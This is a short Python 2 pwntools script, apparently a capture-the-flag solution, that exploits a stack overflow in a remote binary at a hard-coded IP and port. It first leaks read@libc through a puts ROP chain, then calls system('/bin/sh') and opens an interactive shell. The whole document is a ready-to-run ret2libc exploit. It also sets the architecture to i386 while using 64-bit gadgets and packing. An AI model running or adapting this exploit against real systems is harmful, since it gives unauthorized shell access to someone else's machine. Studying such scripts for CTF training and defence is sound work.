#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './path/to/binary'
libc = ELF('./libc.so')

host = args.HOST or '35.198.113.131'
port = int(args.PORT or 31336)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

padding = 'A' * 24

pop_rdi  = b'K\x12@\x00\x00\x00\x00\x00'
read_got = b' @@\x00\x00\x00\x00\x00'
puts_plt = b',\x10@\x00\x00\x00\x00\x00'
main     = b'\xa3\x11@\x00\x00\x00\x00\x00'

read_libc   = 0xf7250
system_libc = 0x45390
binsh_libc  = 0x18cd57

io = start()

# Stage 1. Leak

print(io.recv())
io.sendline(padding + pop_rdi + read_got + puts_plt + main)

leaked_read = u64(io.recvline().strip().ljust(8, '\x00'))
offset      = leaked_read - read_libc

log.success('read@libc: ' + hex(leaked_read))
log.success('Offset: ' + hex(offset))

# Stage 2. g3t_5h311

print(io.recv())
io.sendline(padding + pop_rdi + p64(binsh_libc + offset) + p64(system_libc + offset))

io.interactive()

